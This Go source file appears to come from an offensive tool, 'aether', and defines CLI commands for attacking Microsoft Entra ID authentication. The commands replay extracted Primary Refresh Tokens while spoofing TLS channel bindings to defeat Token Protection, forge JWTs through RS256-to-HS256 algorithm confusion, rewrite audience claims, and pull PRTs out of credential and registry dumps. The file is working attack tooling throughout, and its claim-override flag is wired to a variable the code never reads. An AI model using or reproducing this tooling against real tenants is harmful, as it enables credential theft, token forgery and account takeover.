package cli

import (
	"context"
	"crypto/rsa"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/big"
	"os"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/Debajyoti0-0/aether/internal/engine/token"
	"github.com/Debajyoti0-0/aether/internal/protocol/msoapx"
	"github.com/Debajyoti0-0/aether/internal/types"
)

// tokenCmd — Token Protection & channel binding operations.
var tokenCmd = &cobra.Command{
	Use:   "token",
	Short: "Token Protection & channel binding operations",
	Long:  "Spoof TLS tls-unique channel bindings to replay PRTs from Linux against Token Protection-enforcing tenants.",
}

var tokenProtectCmd = &cobra.Command{
	Use:   "protect",
	Short: "Convert a PRT with Token Protection binding spoof",
	Long: `Convert an extracted PRT to OAuth tokens while presenting the
original host's tls-unique channel binding (x-client-bound header).
This defeats Entra ID Token Protection, which binds tokens to the
issuing device's TLS session.`,
	RunE: runTokenProtect,
}

var tokenShowCmd = &cobra.Command{
	Use:   "show",
	Short: "Render the channel binding header for a binding dump",
	RunE: func(cmd *cobra.Command, args []string) error {
		data, err := os.ReadFile(prtBinding)
		if err != nil {
			return fmt.Errorf("read binding: %w", err)
		}
		cb, err := msoapx.LoadChannelBinding(string(data))
		if err != nil {
			return err
		}
		out := map[string]string{
			"x-client-bound":     cb.GenerateHeader(),
			"x-ms-client-binding": cb.GenerateHeader(),
		}
		enc := json.NewEncoder(os.Stdout)
		enc.SetIndent("", "  ")
		return enc.Encode(out)
	},
}

var (
	tokenPRTFile    string
	tokenBinding    string
	tokenTenant     string
	tokenClientID   string
	tokenResource   string
	tokenOutput     string
	tokenPreset     string
	tokenTimeout    int
)

func init() {
	rootCmd.AddCommand(tokenCmd)
	tokenCmd.AddCommand(tokenProtectCmd, tokenShowCmd, tokenConfuseCmd, tokenRepurposeCmd)

	tokenProtectCmd.Flags().StringVar(&tokenPRTFile, "prt-file", "", "PRT JSON file (required)")
	tokenProtectCmd.Flags().StringVar(&tokenBinding, "tls-binding", "", "tls-unique binding dump (required)")
	tokenProtectCmd.Flags().StringVar(&tokenTenant, "tenant", "", "Tenant override")
	tokenProtectCmd.Flags().StringVar(&tokenClientID, "client-id", token.DefaultClientID, "Public client id")
	tokenProtectCmd.Flags().StringVar(&tokenResource, "resource", "https://graph.microsoft.com/.default", "Resource/scope")
	tokenProtectCmd.Flags().StringVar(&tokenOutput, "output", "", "Output tokens JSON file")
	tokenProtectCmd.Flags().StringVar(&tokenPreset, "browser-preset", "chrome", "TLS fingerprint preset")
	tokenProtectCmd.Flags().IntVar(&tokenTimeout, "timeout", 30, "Timeout seconds")
	_ = tokenProtectCmd.MarkFlagRequired("prt-file")
	_ = tokenProtectCmd.MarkFlagRequired("tls-binding")

	tokenShowCmd.Flags().StringVar(&prtBinding, "binding", "", "Binding dump file (required)")
	_ = tokenShowCmd.MarkFlagRequired("binding")

	// Crypto-abuse: JWT alg confusion + aud repurpose.
	tokenConfuseCmd.Flags().StringVar(&confuseJWT, "jwt", "", "RS256 JWT to confuse (required)")
	tokenConfuseCmd.Flags().StringVar(&confuseN, "n", "", "RSA modulus hex (public key)")
	tokenConfuseCmd.Flags().StringVar(&confuseE, "e", "", "RSA exponent hex (public key)")
	tokenConfuseCmd.Flags().StringVar(&confuseClaims, "set-claim", "", "key=value claim override (repeatable)")
	_ = tokenConfuseCmd.MarkFlagRequired("jwt")
	_ = tokenConfuseCmd.MarkFlagRequired("n")

	tokenRepurposeCmd.Flags().StringVar(&repurposeJWT, "jwt", "", "JWT to repurpose (required)")
	tokenRepurposeCmd.Flags().StringVar(&repurposeAud, "aud", "", "New audience claim (required)")
	_ = tokenRepurposeCmd.MarkFlagRequired("jwt")
	_ = tokenRepurposeCmd.MarkFlagRequired("aud")

	prtExtractCmd.Flags().StringSliceVar(&prtExtractFiles, "dump", nil, "Dump file(s) to scan (required)")
	prtExtractCmd.Flags().StringVar(&prtExtractOut, "output", "", "Write extracted PRTs JSON to file")
	_ = prtExtractCmd.MarkFlagRequired("dump")
}

// tokenConfuseCmd — RS256→HS256 algorithm confusion.
var tokenConfuseCmd = &cobra.Command{
	Use:   "confuse",
	Short: "Forge a JWT via RS256→HS256 algorithm confusion",
	Long: `Sign a JWT with HS256 using the target's RSA public key as the HMAC
secret. Exploits verifiers that accept HS256 while publishing an RSA
JWKS. The original header/claims are preserved; --set-claim overrides
specific claims in the forged token.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		nBytes, err := hexDecodeBig(confuseN)
		if err != nil {
			return fmt.Errorf("parse modulus: %w", err)
		}
		eBytes, err := hexDecodeBig(confuseE)
		if err != nil {
			return fmt.Errorf("parse exponent: %w", err)
		}
		pub := &rsa.PublicKey{N: new(big.Int).SetBytes(nBytes), E: intFromBytes(eBytes)}

		overrides := map[string]any{}
		for _, kv := range confuseClaimList {
			parts := strings.SplitN(kv, "=", 2)
			if len(parts) != 2 {
				return fmt.Errorf("invalid --set-claim %q (want key=value)", kv)
			}
			overrides[parts[0]] = parts[1]
		}

		res, err := token.ConfuseJWT(confuseJWT, pub, overrides)
		if err != nil {
			return err
		}
		enc := json.NewEncoder(os.Stdout)
		enc.SetIndent("", "  ")
		return enc.Encode(res)
	},
}

var (
	confuseJWT       string
	confuseN         string
	confuseE         string
	confuseClaims    string
	confuseClaimList []string
)

// tokenRepurposeCmd — aud confusion artifact generation.
var tokenRepurposeCmd = &cobra.Command{
	Use:   "repurpose",
	Short: "Rewrite the aud claim into an unsigned test artifact",
	RunE: func(cmd *cobra.Command, args []string) error {
		res, err := token.RepurposeAud(repurposeJWT, repurposeAud)
		if err != nil {
			return err
		}
		enc := json.NewEncoder(os.Stdout)
		enc.SetIndent("", "  ")
		return enc.Encode(res)
	},
}

var (
	repurposeJWT string
	repurposeAud string
)

func hexDecodeBig(s string) ([]byte, error) {
	s = strings.TrimSpace(strings.TrimPrefix(strings.TrimPrefix(s, "0x"), "0X"))
	if len(s)%2 != 0 {
		s = "0" + s
	}
	return hex.DecodeString(s)
}

func intFromBytes(b []byte) int {
	v := 0
	for _, x := range b {
		v = v*256 + int(x)
	}
	if v == 0 {
		return 65537
	}
	return v
}

func runTokenProtect(cmd *cobra.Command, args []string) error {
	prt, err := token.LoadPRT(tokenPRTFile)
	if err != nil {
		return err
	}
	if tokenTenant != "" {
		prt.TenantID = tokenTenant
	}

	bindData, err := os.ReadFile(tokenBinding)
	if err != nil {
		return fmt.Errorf("read tls binding: %w", err)
	}
	binding, err := msoapx.LoadChannelBinding(string(bindData))
	if err != nil {
		return fmt.Errorf("tls binding: %w", err)
	}

	client, err := msoapx.NewClient(tokenPreset, time.Duration(tokenTimeout)*time.Second)
	if err != nil {
		return err
	}
	client.Binding = binding

	converter := token.NewPRTConverter(client)
	tokens, err := converter.ConvertPRTToOAuth(context.Background(), prt, tokenClientID, tokenResource)
	if err != nil {
		return err
	}

	if err := saveTokens(tokens, tokenOutput); err != nil {
		return err
	}
	return printTokens(tokens)
}

// prtExtractCmd — in-memory PRT extraction from dumps.
var prtExtractCmd = &cobra.Command{
	Use:   "extract",
	Short: "Extract PRTs from registry/credential dumps",
	Long: `Scan a dump (registry export, Credential Manager dump, AAD Broker
plugin dump, clipboard capture) for PRT-shaped JSON objects and raw
base64url PRT cookies. Output is normalized PRT JSON ready for
'aether prt convert'.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		extractor := token.NewExtract()

		var all []types.PRT
		for _, dump := range prtExtractFiles {
			prts, err := extractor.ExtractFromFile(dump)
			if err != nil {
				fmt.Fprintf(os.Stderr, "[!] %s: %v\n", dump, err)
				continue
			}
			fmt.Fprintf(os.Stderr, "[+] %s: %d PRT(s)\n", dump, len(prts))
			all = append(all, prts...)
		}
		if len(all) == 0 {
			return fmt.Errorf("no PRTs found in any dump")
		}

		data, err := token.MarshalPRTs(all)
		if err != nil {
			return err
		}
		if prtExtractOut != "" {
			if err := os.WriteFile(prtExtractOut, data, 0o600); err != nil {
				return err
			}
			fmt.Fprintf(os.Stderr, "Wrote %d PRT(s) to %s\n", len(all), prtExtractOut)
			return nil
		}
		os.Stdout.Write(data)
		fmt.Println()
		return nil
	},
}

var (
	prtExtractFiles []string
	prtExtractOut   string
)

func init() {
	prtCmd.AddCommand(prtExtractCmd)
}
